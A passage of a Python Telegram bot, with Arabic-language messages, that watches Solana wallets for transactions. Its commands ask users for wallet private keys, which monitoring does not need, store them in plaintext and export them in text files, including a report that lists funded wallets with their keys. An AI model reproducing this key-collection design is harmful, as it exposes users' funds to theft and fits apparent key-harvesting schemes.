                        f"✅{total_successful} ❌{total_failed} checks | "
                        f"Delay: {limiter_stats['current_delay']:.3f}s | "
                        f"Mode: {limiter_stats['performance_mode']} | "
                        f"Rate: {limiter_stats['recent_request_rate']}/10s | "
                        f"Success: {success_rate:.1f}%"
                    )
                    
                    # Performance warnings
                    if cycle_time > 90:  # More than 1.5 minutes
                        logger.warning(f"⚠️ Long cycle time: {cycle_time:.1f}s - consider optimization")
                    elif cycle_time < 30:  # Less than 30 seconds
                        logger.info(f"🚀 Fast cycle time: {cycle_time:.1f}s - excellent performance!")

                    # Wait for next polling interval
                    await asyncio.sleep(POLLING_INTERVAL)

                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.error(f"Error in global monitoring task: {e}")
                    await asyncio.sleep(POLLING_INTERVAL)

        # Start global monitoring task
        if 'global_monitor' not in self.monitoring_tasks:
            task = asyncio.create_task(global_monitor_task())
            self.monitoring_tasks['global_monitor'] = {
                'task': task,
                'callback': callback_func,
                'type': 'global'
            }

    async def process_wallet_batch(self, wallet_batch: List[dict], batch_number: int, total_wallets: int):
        """Process a batch of wallets with smart rate limiting and performance optimization"""
        batch_start_time = asyncio.get_event_loop().time()
        successful_checks = 0
        failed_checks = 0
        wallet_times = []
        
        try:
            logger.debug(f"📦 Starting batch {batch_number}: {len(wallet_batch)} wallets (mode: {self.rate_limiter.performance_mode})")
            
            # Process wallets in the batch sequentially with smart delays
            for i, wallet_info in enumerate(wallet_batch):
                try:
                    wallet_start_time = asyncio.get_event_loop().time()
                    
                    # Check transactions for this wallet
                    await self.check_transactions_optimized(wallet_info['wallet_address'])
                    
                    successful_checks += 1
                    
                    wallet_duration = asyncio.get_event_loop().time() - wallet_start_time
                    wallet_times.append(wallet_duration)
                    
                    # Only log individual wallet times in debug mode for very slow wallets
                    if wallet_duration > 2.0:
                        logger.debug(f"  🐌 Slow wallet {i+1}/{len(wallet_batch)}: {wallet_duration:.2f}s")
                    
                except Exception as e:
                    failed_checks += 1
                    wallet_duration = asyncio.get_event_loop().time() - wallet_start_time
                    wallet_times.append(wallet_duration)
                    logger.debug(f"  ❌ Error processing wallet {i+1}/{len(wallet_batch)} in {wallet_duration:.2f}s: {e}")
            
            batch_duration = asyncio.get_event_loop().time() - batch_start_time
            avg_wallet_time = sum(wallet_times) / len(wallet_times) if wallet_times else 0
            
            # Get rate limiter stats
            limiter_stats = self.rate_limiter.get_stats()
            
            # Enhanced batch logging with performance metrics
            logger.debug(
                f"📦 Batch {batch_number} completed: "
                f"✅{successful_checks} ❌{failed_checks} "
                f"in {batch_duration:.1f}s "
                f"(avg: {avg_wallet_time:.2f}s/wallet, "
                f"delay: {limiter_stats['current_delay']:.3f}s, "
                f"rate: {limiter_stats['recent_request_rate']}/10s)"
            )
            
            # Performance optimization suggestions
            if avg_wallet_time > 1.0 and self.rate_limiter.performance_mode != 'careful':
                logger.debug(f"💡 Batch {batch_number}: Average wallet time high ({avg_wallet_time:.2f}s), may need optimization")
            
        except Exception as e:
            logger.error(f"Critical error in batch {batch_number}: {e}")
            
        return {
            'batch_number': batch_number,
            'successful_checks': successful_checks,
            'failed_checks': failed_checks,
            'duration': asyncio.get_event_loop().time() - batch_start_time,
            'avg_wallet_time': sum(wallet_times) / len(wallet_times) if wallet_times else 0
        }

    async def start_monitoring_wallet(self, wallet_address: str, chat_id: int = None, callback_func=None):
        """Start monitoring for a specific wallet (now uses global monitoring)"""
        # Store callback info for this wallet
        task_key = f"{wallet_address}_{chat_id}" if chat_id else wallet_address
        self.monitoring_tasks[task_key] = {
            'callback': callback_func,
            'chat_id': chat_id,
            'wallet_address': wallet_address,
            'type': 'wallet'
        }

        # Ensure global monitoring is running
        await self.start_global_monitoring(callback_func)

    async def check_transactions_optimized(self, wallet_address: str):
        """Optimized transaction checking with enhanced parallel processing"""
        try:
            # Get recent transactions with rate limiting
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getSignaturesForAddress",
                "params": [
                    wallet_address,
                    {"limit": 15}  # زيادة حد المعاملات لاكتشاف أفضل وأسرع
                ]
            }

            data = await self.make_rpc_call(payload, max_retries=2)  # Reduced retries for speed
            if not data or 'result' not in data or not data['result']:
                return

            signatures = data['result']

            # Get wallet info from database
            wallets = await self.db_manager.get_monitored_wallets_by_address(wallet_address)
            if not wallets:
                return

            last_signature = wallets[0].get('last_signature')
            monitoring_start_time = wallets[0].get('monitoring_start_time')

            # Check if this is the first check - mark all current transactions as already processed
            if not last_signature:
                if signatures:
                    # On first check, save the most recent signature without processing any transactions
                    await self.db_manager.update_last_signature(wallet_address, signatures[0]['signature'])
                return

            # Find new transactions
            new_transactions = []

            for sig_info in signatures:
                if sig_info['signature'] == last_signature:
                    break

                # Filter by monitoring start time if available
                tx_time = sig_info.get('blockTime')
                if monitoring_start_time and tx_time and tx_time < monitoring_start_time:
                    continue

                new_transactions.append(sig_info)

            # Process new transactions in parallel
            if new_transactions:
                await self.db_manager.update_last_signature(wallet_address, new_transactions[0]['signature'])

                # Process all new transactions in parallel
                transaction_tasks = []
                for tx_info in reversed(new_transactions):  # Process in chronological order
                    # Double-check transaction time before processing
                    tx_time = tx_info.get('blockTime')
                    if monitoring_start_time and tx_time and tx_time < monitoring_start_time:
                        continue

                    # Create parallel task for each transaction
                    task = asyncio.create_task(
                        self.process_single_transaction(wallet_address, tx_info)
                    )
                    transaction_tasks.append(task)

                # Execute all transaction processing in parallel
                if transaction_tasks:
                    await asyncio.gather(*transaction_tasks, return_exceptions=True)

        except Exception as e:
            # Reduce error logging for better performance
            if not any(keyword in str(e).lower() for keyword in ['timeout', 'network', 'connection']):
                logger.error(f"Error checking transactions for {wallet_address[:8]}...: {e}")

    async def process_single_transaction(self, wallet_address: str, tx_info: dict):
        """Process a new transaction and send notification"""
        try:
            signature = tx_info['signature']
            
            # التحقق أولاً من عدم معالجة هذه المعاملة مسبقاً
            if await self.db_manager.is_transaction_already_notified(signature):
                logger.debug(f"⏭️ Transaction {signature[:16]}... already processed, skipping")
                return

            # Get wallet info from database
            wallets = await self.db_manager.get_monitored_wallets_by_address(wallet_address)
            if not wallets:
                logger.debug(f"No wallets found for address {truncate_address(wallet_address)}")
                return

            # Get detailed transaction data with rate limiting
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getTransaction",
                "params": [
                    signature,
                    {"encoding": "json", "maxSupportedTransactionVersion": 0}
                ]
            }

            data = await self.make_rpc_call(payload)
            if not data or 'result' not in data or not data['result']:
                logger.debug(f"No transaction data received for {signature[:16]}...")
                return

            transaction = data['result']

            # Extract transaction details
            amount, tx_type = self.calculate_balance_change(transaction, wallet_address)
            timestamp = format_timestamp(transaction.get('blockTime', 0))
            block_time = transaction.get('blockTime', 0)

            logger.info(f"📝 Processing NEW transaction: {amount} SOL ({tx_type}) for wallet {truncate_address(wallet_address)}")

            # Check if this is a dust transaction (very small amount)
            try:
                amount_float = abs(float(amount))  # Get absolute value
                
                # نظام إشعارات عاجلة للمعاملات الكبيرة
                is_urgent_transaction = amount_float >= 0.1  # معاملات 0.1 SOL وأكثر تعتبر عاجلة
                
                # Skip notifications for dust transactions (less than MIN_NOTIFICATION_AMOUNT SOL)
                if amount_float < MIN_NOTIFICATION_AMOUNT:
                    logger.info(f"💨 Skipping dust transaction: {amount} SOL < {MIN_NOTIFICATION_AMOUNT} SOL threshold for wallet {truncate_address(wallet_address)}")
                    # Still store in database but don't send notification
                    for wallet_info in wallets:
                        await self.db_manager.add_transaction_record(
                            wallet_address,
                            wallet_info['chat_id'],
                            signature,
                            amount,
                            "🌫️ معاملة غبار (تم تجاهلها)",
                            block_time or 0
                        )
                    return
                
                # إشعار فوري للمعاملات العاجلة
                if is_urgent_transaction:
                    logger.info(f"🚨 URGENT: Large transaction detected: {amount} SOL for wallet {truncate_address(wallet_address)}")
                else:
                    logger.info(f"📊 Regular transaction: {amount} SOL for wallet {truncate_address(wallet_address)}")
                    
            except (ValueError, TypeError):
                # If amount conversion fails, proceed with notification
                logger.warning(f"⚠️ Could not parse amount '{amount}' as float, proceeding with notification")

            # Store transaction in database - only for the first user to avoid duplicates
            transaction_stored = False
            for wallet_info in wallets:
                if not transaction_stored:
                    success = await self.db_manager.add_transaction_record(
                        wallet_address,
                        wallet_info['chat_id'],
                        signature,
                        amount,
                        tx_type,
                        block_time or 0
                    )
                    if success:
                        transaction_stored = True
                        logger.info(f"💾 Stored NEW transaction in database")
                        break
                    else:
                        logger.debug(f"📋 Transaction {signature[:16]}... already exists in database")
                        return  # إنهاء المعالجة إذا كانت المعاملة موجودة مسبقاً

            # إرسال الإشعار فقط إذا تم حفظ المعاملة كجديدة
            if transaction_stored:
                # Send notification through global monitoring callback
                callback_found = False
                for task_key, task_info in self.monitoring_tasks.items():
                    if (isinstance(task_info, dict) and 
                        'callback' in task_info and 
                        task_info['callback'] and
                        task_info.get('type') == 'global'):
                        
                        logger.info(f"📞 Calling notification callback for wallet {truncate_address(wallet_address)}")
                        try:
                            await task_info['callback'](
                                wallets[0]['chat_id'],  # Use first user's chat_id as reference
                                wallet_address,
                                amount,
                                tx_type,
                                timestamp,
                                signature
                            )
                            callback_found = True
                            logger.info(f"✅ Notification sent successfully")
                            break
                        except Exception as callback_error:
                            logger.error(f"❌ Error in notification callback: {callback_error}")

                if not callback_found:
                    logger.warning(f"⚠️ No notification callback found for wallet {truncate_address(wallet_address)}")

        except Exception as e:
            logger.error(f"❌ Error processing transaction for {truncate_address(wallet_address)}: {e}")
            import traceback
            logger.error(traceback.format_exc())

    async def get_wallet_balance(self, wallet_address: str) -> float:
        """Get SOL balance for a wallet address with smart rate limiting"""
        try:
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [wallet_address]
            }

            # Use smart rate limiting with retries
            data = await self.make_rpc_call(payload, max_retries=2)
            if data and 'result' in data and 'value' in data['result']:
                lamports = data['result']['value']
                sol_balance = lamports / 1_000_000_000  # Convert to SOL
                return sol_balance

            return 0.0

        except Exception as e:
            logger.warning(f"Error getting balance for {wallet_address[:8]}...: {e}")
            return 0.0

    def calculate_balance_change(self, transaction: dict, wallet_address: str) -> tuple[str, str]:
        """Calculate balance change and transaction type for the monitored wallet"""
        try:
            meta = transaction.get('meta', {})
            account_keys = transaction.get('transaction', {}).get('message', {}).get('accountKeys', [])

            # Find wallet index in account keys
            wallet_index = None
            for i, key in enumerate(account_keys):
                if key == wallet_address:
                    wallet_index = i
                    break

            if wallet_index is None:
                return "0", "معاملة عامة"

            # Get balance changes
            pre_balances = meta.get('preBalances', [])
            post_balances = meta.get('postBalances', [])

            if len(pre_balances) > wallet_index and len(post_balances) > wallet_index:
                pre_balance = pre_balances[wallet_index]
                post_balance = post_balances[wallet_index]
                change = post_balance - pre_balance
                amount = format_sol_amount(change)

                # Check for trading/DEX programs FIRST before checking balance direction
                instructions = transaction.get('transaction', {}).get('message', {}).get('instructions', [])
                for instruction in instructions:
                    program_id = instruction.get('programId', '')
                    # Extended list of known DEX and trading programs
                    trading_programs = [
                        '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8',  # Raydium V4
                        '9W959DqEETiGZocYWCQPaJ6sBmUzgfxXfqGeTEdp3aQP',  # Orca
                        'JUP4Fb2cqiRUcaTHdrPC8h2gNsA2ETXiPDD33WcGuJB',   # Jupiter V4
                        'JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4',   # Jupiter V6
                        'whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc',   # Whirlpool (Orca)
                        'CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK',   # Raydium CLMM
                        'PhoeNiXZ8ByJGLkxNfZRnkUfjvmuYqLR89jjFHGqdXY',   # Phoenix
                        'MarBmsSgKXdrN1egZf5sqe1TMai9K1rChYNDJgjq7aD',   # Mango Markets
                        '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1',   # GooseFX
                        'DjVE6JNiYqPL2QXyCUUh8rNjHrbz9hXHNYt99MQ59qw1',   # Orca V1
                        'SSwpkEEcbUqx4vtoEByFjSkhKdCT862DNVb52nZg1UZ',    # Saber
                        'AMM55ShdkoGRB5jVYPjWzTURSGdQnQ8LbtE4jktMTG8P',   # Aldrin AMM
                        'EhYXEhg6JT5p2ZnhbRSFzKHigPuKFZuL9EGo7ZtDC5VY',   # Serum DEX
                        'srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX',    # Serum DEX V3
                        '22Y43yTVxuUkoRKdm9thyRhQ3SdgQS7c7kB6UNCiaczD',   # Meteora
                        'LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo',    # Lifinity
                        'EewxydAPCCVuNEyrVN68PuSYdQ7wKn27V9Gjeoi8dy3S',   # Lifinity V2
                        'RaydiumCLMM',  # Placeholder for any Raydium CLMM variations
                    ]

                    if program_id in trading_programs:
                        return amount, "🔄 تداول"

                # Check for token program interactions (might be token swaps)
                for instruction in instructions:
                    program_id = instruction.get('programId', '')
                    if program_id == 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA':  # SPL Token Program
                        # Check if there are multiple token transfers (swap indicator)
                        token_transfers = meta.get('preTokenBalances', []) or meta.get('postTokenBalances', [])
                        if len(token_transfers) > 1:
                            return amount, "🔄 تداول"

                # If no trading programs detected, determine by balance change
                if change > 0:
                    tx_type = "📥 استلام"
                elif change < 0:
                    tx_type = "📤 إرسال"
                else:
                    tx_type = "📋 معاملة عامة"

                return amount, tx_type

            return "0", "معاملة عامة"

        except Exception as e:
            logger.error(f"Error calculating balance change: {e}")
            return "0", "معاملة عامة"

    async def get_monitored_wallets_for_chat(self, chat_id: int) -> List[str]:
        """Get list of wallet addresses monitored for a specific chat"""
        wallets = await self.db_manager.get_monitored_wallets(chat_id)
        return [wallet['wallet_address'] for wallet in wallets]

    async def stop_all_monitoring(self):
        """Stop all monitoring tasks"""
        for task in self.monitoring_tasks.values():
            if isinstance(task, dict):
                task['task'].cancel()
            else:
                task.cancel()
        self.monitoring_tasks.clear()
        await self.close_session()


# Telegram Bot
class SolanaWalletBot:
    def __init__(self):
        self.monitor = SolanaMonitor()
        self.user_states: Dict[int, str] = {}  # chat_id -> state
        self.application = None

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        chat_id = update.effective_chat.id
        user = update.effective_user

        # Add user to database
        await self.monitor.db_manager.add_user(
            chat_id, user.username, user.first_name, user.last_name
        )

        await update.message.reply_text(MESSAGES["welcome"])

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        await update.message.reply_text(MESSAGES["help_text"])

    async def monitor_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /monitor command"""
        chat_id = update.effective_chat.id

        # Check if user has reached maximum wallets
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
        if len(monitored_wallets) >= MAX_MONITORED_WALLETS:
            await update.message.reply_text(
                MESSAGES["max_wallets_reached"].format(max_wallets=MAX_MONITORED_WALLETS)
            )
            return

        # Set user state to waiting for private key
        self.user_states[chat_id] = "waiting_private_key"
        await update.message.reply_text(MESSAGES["enter_private_key"])

    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stop command with optional wallet address parameter"""
        chat_id = update.effective_chat.id
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)

        if not monitored_wallets:
            await update.message.reply_text(MESSAGES["no_wallets_monitored"])
            return

        # Check if wallet address is provided as parameter
        if context.args and len(context.args) > 0:
            wallet_address = context.args[0].strip()
            
            # Find the wallet in user's monitored wallets
            wallet_found = False
            for wallet in monitored_wallets:
                if (wallet['wallet_address'] == wallet_address or 
                    wallet['wallet_address'].startswith(wallet_address) or
                    wallet_address in wallet['wallet_address']):
                    
                    # Stop monitoring this wallet
                    success = await self.monitor.remove_wallet(wallet['wallet_address'], chat_id)
                    
                    if success:
                        await update.message.reply_text(
                            MESSAGES["monitoring_stopped"].format(
                                wallet_address=truncate_address(wallet['wallet_address'])
                            )
                        )
                        logger.info(f"Stopped monitoring wallet {wallet['wallet_address']} via command parameter")
                    else:
                        await update.message.reply_text(MESSAGES["wallet_not_found"])
                    
                    wallet_found = True
                    break
            
            if not wallet_found:
                await update.message.reply_text(
                    f"❌ لم يتم العثور على المحفظة: {wallet_address}\n\n"
                    "تأكد من صحة العنوان أو استخدم /stop بدون معاملات لعرض قائمة المحافظ."
                )
            return

        # If no address provided, show traditional interface for small numbers
        if len(monitored_wallets) <= 20:  # Show buttons only for 20 wallets or less
            # Create inline keyboard with wallet options
            keyboard = []
            for wallet in monitored_wallets:
                keyboard.append([
                    InlineKeyboardButton(
                        f"🔴 {truncate_address(wallet['wallet_address'])}",
                        callback_data=f"stop_{wallet['wallet_address']}"
                    )
                ])

            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                MESSAGES["select_wallet_to_stop"],
                reply_markup=reply_markup
            )
        else:
            # For many wallets, show text list with instructions
            message = f"📋 لديك {len(monitored_wallets)} محفظة مراقبة.\n\n"
            message += "لإيقاف مراقبة محفظة محددة، استخدم:\n"
            message += "<code>/stop عنوان_المحفظة</code>\n\n"
            message += "يمكنك استخدام جزء من العنوان أو العنوان كاملاً.\n\n"
            message += "📝 أول 10 محافظ:\n"
            
            for i, wallet in enumerate(monitored_wallets[:10], 1):
                nickname = f" ({wallet['nickname']})" if wallet['nickname'] else ""
                message += f"{i}. <code>{truncate_address(wallet['wallet_address'])}</code>{nickname}\n"
            
            if len(monitored_wallets) > 10:
                message += f"\n... و {len(monitored_wallets) - 10} محفظة أخرى\n"
                message += "\nاستخدم /list لعرض جميع المحافظ مع العناوين الكاملة."
            
            await update.message.reply_text(message, parse_mode='HTML')

    async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /list command - send wallets as formatted text file with private keys"""
        chat_id = update.effective_chat.id
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)

        if not monitored_wallets:
            await update.message.reply_text(MESSAGES["no_wallets_monitored"])
            return

        try:
            # Get all monitored wallets with private keys for this user
            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            user_wallets_with_keys = [wallet for wallet in all_wallets if wallet['chat_id'] == chat_id]

            # Create a dictionary for faster lookup
            wallet_keys_dict = {wallet['wallet_address']: wallet['private_key'] for wallet in user_wallets_with_keys}

            # Create formatted content for text file in English to avoid encoding issues
            file_content = f"Solana Wallets List with Private Keys\n"
            file_content += f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            file_content += f"Total Wallets: {len(monitored_wallets)}\n"
            file_content += "=" * 80 + "\n\n"

            for i, wallet in enumerate(monitored_wallets, 1):
                file_content += f"WALLET #{i}\n"
                file_content += f"{'=' * 60}\n\n"
                
                # Wallet address
                file_content += f"Address:\n{wallet['wallet_address']}\n\n"
                
                # Private key
                private_key = wallet_keys_dict.get(wallet['wallet_address'], 'Not available')
                file_content += f"Private Key:\n{private_key}\n\n"
                
                # Nickname if available
                if wallet['nickname']:
                    file_content += f"Nickname: {wallet['nickname']}\n\n"
                
                # Monitoring start time if available
                if wallet.get('monitoring_start_time'):
                    start_time = format_timestamp(wallet['monitoring_start_time'])
                    file_content += f"Monitoring Started: {start_time}\n\n"
                
                # Add separator line between wallets
                file_content += "=" * 80 + "\n\n"

            # Add security warning
            file_content += "\n" + "!" * 80 + "\n"
            file_content += "SECURITY WARNING:\n"
            file_content += "Keep this file secure and do not share it with anyone!\n"
            file_content += "These private keys give full access to the wallets.\n"
            file_content += "!" * 80 + "\n"

            # Remove the last separator before security warning
            file_content = file_content.replace("=" * 80 + "\n\n\n" + "!" * 80, "\n" + "!" * 80)

            # Create filename with timestamp
            filename = f"wallets_list_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

            # Write to file with explicit UTF-8 encoding and BOM for better compatibility
            with open(filename, 'w', encoding='utf-8-sig', newline='\n') as f:
                f.write(file_content)

            # Send the file to user
            with open(filename, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=filename,
                    caption=f"📋 قائمة المحافظ مع المفاتيح الخاصة ({len(monitored_wallets)} محفظة)\n\n🔐 ⚠️ احتفظ بهذا الملف في مكان آمن!"
                )

            # Delete the file after sending
            os.remove(filename)

            logger.info(f"Sent wallets list file to user {chat_id}")

        except Exception as e:
            logger.error(f"Error in list command: {e}")
            await update.message.reply_text(MESSAGES["error_occurred"].format(error=str(e)))

    async def bulk_add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /add command - add multiple wallets from text"""
        chat_id = update.effective_chat.id

        # Check if user has reached maximum wallets
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
        if len(monitored_wallets) >= MAX_MONITORED_WALLETS:
            await update.message.reply_text(
                MESSAGES["max_wallets_reached"].format(max_wallets=MAX_MONITORED_WALLETS)
            )
            return

        # Set user state to waiting for bulk private keys
        self.user_states[chat_id] = "waiting_bulk_private_keys"
        await update.message.reply_text(
            "📝 أرسل المفاتيح الخاصة (يمكن إرسال عدة مفاتيح في رسالة واحدة):\n\n"
            "💡 يمكنك إرسال:\n"
            "• مفتاح واحد أو عدة مفاتيح\n"
            "• مع أي نص إضافي (سيتم تجاهله)\n"
            "• بتنسيق base58 أو array\n\n"
            "⚠️ تأكد من أن المفاتيح صحيحة ولا تشاركها مع أي شخص آخر!"
        )

    async def keys_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /k command - send all private keys in a text file"""
        chat_id = update.effective_chat.id

        try:
            # Get all monitored wallets for this user
            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            user_wallets = [wallet for wallet in all_wallets if wallet['chat_id'] == chat_id]

            if not user_wallets:
                await update.message.reply_text(MESSAGES["no_wallets_monitored"])
                return

            # Create content for the text file in English with proper formatting
            file_content = "Solana Private Keys Export\n"
            file_content += f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            file_content += f"Number of Wallets: {len(user_wallets)}\n"
            file_content += "=" * 60 + "\n\n"

            for i, wallet in enumerate(user_wallets, 1):
                file_content += f"Wallet Address:\n"
                file_content += f"{wallet['wallet_address']}\n\n"
                file_content += f"Private Key:\n"
                file_content += f"{wallet['private_key']}\n\n"

                if wallet['nickname']:
                    file_content += f"Nickname: {wallet['nickname']}\n\n"

                file_content += "_" * 60 + "\n\n"

            file_content += "SECURITY WARNING:\n"
            file_content += "Do not share these private keys with anyone!\n"
            file_content += "Keep this file in a secure and protected location.\n"

            # Create filename with timestamp
            filename = f"solana_keys_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

            # Write to file with explicit UTF-8 encoding
            with open(filename, 'w', encoding='utf-8', newline='\n') as f:
                f.write(file_content)

            # Send the file to user
            with open(filename, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=filename,
                    caption="🔐 Your private keys file\n\n⚠️ Keep this file in a secure location!"
                )

            # Delete the file after sending
            os.remove(filename)

            logger.info(f"Sent private keys file to user {chat_id}")

        except Exception as e:
            logger.error(f"Error in keys command: {e}")
            await update.message.reply_text(MESSAGES["error_occurred"].format(error=str(e)))

    async def rich_wallets_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /r command - show wallets with SOL balance only (optimized)"""
        chat_id = update.effective_chat.id
        monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)

        if not monitored_wallets:
            await update.message.reply_text(MESSAGES["no_wallets_monitored"])
            return

        try:
            # Send status message
            status_message = await update.message.reply_text(
                f"🔍 جاري فحص {len(monitored_wallets)} محفظة للبحث عن الأرصدة...\n\n"
                "⏳ يرجى الانتظار..."
            )

            wallets_with_balance = []
            total_balance = 0.0
            checked_count = 0
            timeout_count = 0

            # Get all monitored wallets with private keys
            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            user_wallets_with_keys = [wallet for wallet in all_wallets if wallet['chat_id'] == chat_id]

            # Create a dictionary for faster lookup
            wallet_keys_dict = {wallet['wallet_address']: wallet['private_key'] for wallet in user_wallets_with_keys}

            # Process wallets in smaller batches with shorter timeout
            batch_size = 5  # تقليل حجم الدفعة لتقليل الضغط على RPC
            
            for i in range(0, len(monitored_wallets), batch_size):
                batch = monitored_wallets[i:i + batch_size]
                
                # Update status every 5 wallets
                if i % 5 == 0 or i + batch_size >= len(monitored_wallets):
                    await status_message.edit_text(
                        f"🔍 فحص الأرصدة: {min(i + batch_size, len(monitored_wallets))}/{len(monitored_wallets)}\n\n"
                        f"💰 محافظ بها رصيد: {len(wallets_with_balance)}\n"
                        f"💎 إجمالي الرصيد: {total_balance:.9f} SOL\n"
                        f"⏱️ انتهت المهلة: {timeout_count} محفظة\n\n"
                        "⏳ جاري الفحص..."
                    )

                # Create tasks for parallel processing with rate limiting
                for wallet in batch:
                    try:
                        # استخدام rate limiter الموجود
                        await self.monitor.rate_limiter.acquire()
                        
                        # فحص الرصيد مع timeout أقصر
                        balance = await asyncio.wait_for(
                            self.monitor.get_wallet_balance(wallet['wallet_address']), 
                            timeout=5.0  # تقليل timeout إلى 5 ثوانٍ
                        )
                        
                        checked_count += 1
                        
                        if balance > 0:
                            wallets_with_balance.append({
                                'address': wallet['wallet_address'],
                                'balance': balance,
                                'nickname': wallet['nickname'],
                                'private_key': wallet_keys_dict.get(wallet['wallet_address'], 'غير متوفر')
                            })
                            total_balance += balance

                    except asyncio.TimeoutError:
                        timeout_count += 1
                        logger.warning(f"Timeout checking balance for wallet {wallet['wallet_address'][:8]}...")
                        continue
                    except Exception as e:
                        logger.error(f"Error checking balance for wallet {wallet['wallet_address'][:8]}: {e}")
                        continue

                # فترة انتظار بين الدفعات لتقليل الضغط على RPC
                await asyncio.sleep(1.0)

            if not wallets_with_balance:
                await status_message.edit_text(
                    "💸 لا توجد محافظ تحتوي على رصيد SOL حالياً.\n\n"
                    "جميع المحافظ المراقبة لديها رصيد صفر."
                )
                return

            # Sort wallets by balance (highest first)
            wallets_with_balance.sort(key=lambda x: x['balance'], reverse=True)

            # Create formatted content for text file with complete address and private key
            file_content = f"تقرير المحافظ الغنية - Solana Rich Wallets Report\n"
            file_content += f"تاريخ التصدير - Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            file_content += f"عدد المحافظ - Total Wallets: {len(wallets_with_balance)}\n"
            file_content += f"إجمالي الرصيد - Total Balance: {total_balance:.9f} SOL\n"
            file_content += f"تم فحص - Checked: {checked_count}/{len(monitored_wallets)} محفظة\n"
            if timeout_count > 0:
                file_content += f"انتهت المهلة - Timeouts: {timeout_count} محفظة\n"
            file_content += "=" * 80 + "\n\n"

            for i, wallet in enumerate(wallets_with_balance, 1):
                file_content += f"المحفظة رقم - WALLET #{i}\n"
                file_content += f"{'=' * 60}\n\n"
                
                # العنوان الكامل - Full wallet address
                file_content += f"العنوان الكامل - Full Address:\n"
                file_content += f"{wallet['address']}\n\n"
                
                # المفتاح الخاص - Private key
                file_content += f"المفتاح الخاص - Private Key:\n"
                file_content += f"{wallet['private_key']}\n\n"
                
                # الرصيد - Balance with more precision
                file_content += f"رصيد SOL - Balance:\n"
                file_content += f"{wallet['balance']:.9f} SOL\n\n"
                
                # الاسم المستعار - Nickname if available
                if wallet['nickname']:
                    file_content += f"الاسم المستعار - Nickname:\n"
                    file_content += f"{wallet['nickname']}\n\n"
                
                # خط فاصل - Separator line
                file_content += "=" * 80 + "\n\n"

            # Add security warning at the end
            file_content += "\n" + "!" * 80 + "\n"
            file_content += "SECURITY WARNING:\n"
            file_content += "Keep this file secure and do not share it with anyone!\n"
            file_content += "These private keys give full access to the wallets.\n"
            file_content += "!" * 80 + "\n"

            # Create filename with timestamp
            filename = f"rich_wallets_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

            # Write to file with explicit UTF-8 encoding
            with open(filename, 'w', encoding='utf-8-sig', newline='\n') as f:
                f.write(file_content)

            # Prepare enhanced summary message
            summary = f"💰 تقرير المحافظ الغنية:\n\n"
            summary += f"📊 النتائج: {len(wallets_with_balance)} محفظة من أصل {len(monitored_wallets)}\n"
            summary += f"✅ تم فحص: {checked_count} محفظة\n"
            if timeout_count > 0:
                summary += f"⏱️ انتهت المهلة: {timeout_count} محفظة\n"
            summary += f"💎 إجمالي الرصيد: {total_balance:.9f} SOL\n"
            if len(wallets_with_balance) > 0:
                summary += f"📈 متوسط الرصيد: {(total_balance/len(wallets_with_balance)):.9f} SOL\n"
            summary += "\n"

            # Show top wallets in the message
            display_count = min(5, len(wallets_with_balance))
            summary += f"🔝 أعلى {display_count} محافظ:\n"

            for i, wallet in enumerate(wallets_with_balance[:display_count], 1):
                summary += f"{i}. {truncate_address(wallet['address'])}\n"
                summary += f"   💰 {wallet['balance']:.9f} SOL\n"
                if wallet['nickname']:
                    summary += f"   📝 {wallet['nickname']}\n"
                summary += "\n"

            if len(wallets_with_balance) > display_count:
                summary += f"📎 +{len(wallets_with_balance) - display_count} محفظة أخرى في الملف\n\n"

            summary += f"🔐 الملف يحتوي على:\n"
            summary += f"• العناوين الكاملة للمحافظ\n"
            summary += f"• المفاتيح الخاصة\n"
            summary += f"• الأرصدة التفصيلية\n"
            summary += f"• الأسماء المستعارة (إن وجدت)"

            # Send the file and summary
            with open(filename, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=filename,
                    caption=summary
                )

            # Delete status message and the file
            await status_message.delete()
            os.remove(filename)

